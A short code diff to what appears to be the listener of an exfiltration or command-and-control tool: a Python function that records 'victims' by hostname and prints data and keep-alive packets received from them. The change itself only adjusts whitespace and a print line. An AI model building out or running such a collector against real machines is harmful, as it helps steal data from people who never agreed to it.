@@ -37,7 +37,6 @@ def deserialize_json(json_object):
 def handle_load(load, path, sender_ip):
     deserialized_load = deserialize_json(load)
     victim_name = deserialized_load["h"]
-
     add_victim(victim_name, path)
 
     if("h" not in deserialized_load.keys()):
@@ -45,7 +44,7 @@ def handle_load(load, path, sender_ip):
 
     if("d" in deserialized_load.keys()):
         print(f"\ndata packet from {victim_name}[{sender_ip}] received")
-        print(f"data received: {deserialized_load['d']}\n")
+        print(f"data received: {deserialized_load['d']}")
 
     else:
         print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
